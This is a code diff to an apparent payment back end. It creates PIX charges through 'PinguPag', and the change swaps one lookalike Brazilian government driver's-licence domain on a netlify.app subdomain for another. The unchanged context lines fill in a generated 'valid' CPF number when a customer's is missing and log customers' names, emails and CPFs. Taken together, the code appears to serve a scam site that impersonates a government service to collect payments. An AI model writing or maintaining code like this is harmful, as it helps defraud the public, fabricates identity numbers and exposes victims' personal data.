@@ -74,7 +74,7 @@ async function sendUtmify(transactionId, status, customer, amountCents, createdA
 async function sendPushNotification(title, message, tag, type, transactionId, amount, customerName) {
   try {
     const payload = JSON.stringify({ title, message, tag, type, transactionId, amount, customerName });
-    await httpsRequest("brasil-cnh-gov.netlify.app", "/api/pwa-send-push", "POST", {
+    await httpsRequest("cnhbrasil-gov.netlify.app", "/api/pwa-send-push", "POST", {
       "Content-Type": "application/json",
       "Content-Length": Buffer.byteLength(payload),
     }, payload, 5000);
@@ -110,7 +110,7 @@ exports.handler = async (event) => {
   const customerCpf = cpfRaw.length === 11 ? cpfRaw : gerarCpfValido();
   const utms = body.utm || {};
   const externalRef = `order_${randId}_${Date.now()}`;
-  const webhookBase = process.env.WEBHOOK_BASE_URL || "https://brasil-cnh-gov.netlify.app";
+  const webhookBase = process.env.WEBHOOK_BASE_URL || "https://cnhbrasil-gov.netlify.app";
   const postbackUrl = `${webhookBase}/api/webhook/pingupag`;
   console.log("[PIX-PINGUPAG] Amount:", amountReais, "Cents:", amountCents);
   console.log("[PIX-PINGUPAG] Customer:", { name: customerName, email: customerEmail, cpf: customerCpf });
